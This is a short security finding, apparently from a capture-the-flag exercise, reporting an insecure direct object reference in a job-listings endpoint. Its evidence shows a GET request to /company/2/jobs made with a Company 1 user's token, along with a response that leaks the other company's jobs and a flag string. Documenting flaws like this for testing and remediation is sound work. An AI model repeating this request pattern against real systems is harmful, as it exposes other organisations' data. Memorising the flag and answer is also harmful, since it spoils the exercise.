findings.title: IDOR - Unauthorized Access to Other Companies' Job Listings (CTF Flag)
findings.description: The /company/{company_id}/jobs endpoint is vulnerable to Insecure Direct Object Reference (IDOR). An authenticated user belonging to Company 1 can access the job listings of any other company by simply changing the company_id path parameter. No authorization check is performed to verify that the requesting user belongs to the requested company. This exposed Company 2's secret job entry containing the CTF flag.
findings.evidence:
Request: GET /company/2/jobs with demo user's JWT (sub=demo, company=1) Response contains:

secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}

Full response body:

Jobs for Company 2

  • company2 Job 1:company2 Job 1 Description
  • company2 Job 2:company2 Job 2 Description
  • secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}

reproduction.expected: Returns job listing for Company 2 including the secret flag entry
